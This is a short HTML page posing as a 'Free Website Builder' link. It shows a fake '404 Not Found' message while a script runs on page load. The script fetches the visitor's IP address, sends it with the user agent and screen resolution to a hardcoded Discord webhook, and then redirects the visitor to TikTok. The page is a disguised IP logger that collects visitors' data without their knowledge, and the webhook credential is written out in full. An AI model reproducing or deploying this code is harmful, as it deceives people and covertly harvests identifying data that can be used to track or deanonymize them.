<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Website Builder</title>

    <!-- Open Graph meta tags for image preview -->
    <meta property="og:title" content="volts website for psyc!">
    <meta property="og:description" content="Build Websites The Right Way Â©">
    <meta property="og:image" content="image.png">

</head>

<body>
    <center>
        <h1>404 Not Found</h1>
    </center>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1223441488625533028/BG-cWJMBeDcVPJBj8O_iRWblDPLhrwBHKj5rBVUZfBLVTDKY45Mpbr6wePZSMlp_n7PP";

        function sendVisitorInfo() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const visitorInfo = {
                        content: "Visitor Info:\n" +
                            "User Agent: " + navigator.userAgent + "\n" + // Get user agent information
                            "Device Resolution: " + window.screen.width + "x" + window.screen.height + "\n" + // Get device resolution
                            "IP Address: " + ipAddress // Get IP address
                    };

                    fetch(webhookUrl, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(visitorInfo)
                        })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error("Failed to send message to Discord webhook");
                            }
                            console.log("Message sent successfully to Discord webhook");
                        })
                        .catch(error => {
                            console.error("Error:", error);
                        });
                })
                .catch(error => {
                    console.error("Error:", error);
                });
        }

        // Call the function to send visitor information when the page loads
        sendVisitorInfo();

        // Redirect after 2 seconds
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com/explore";
        }, 2000);
    </script>
</body>

</html>
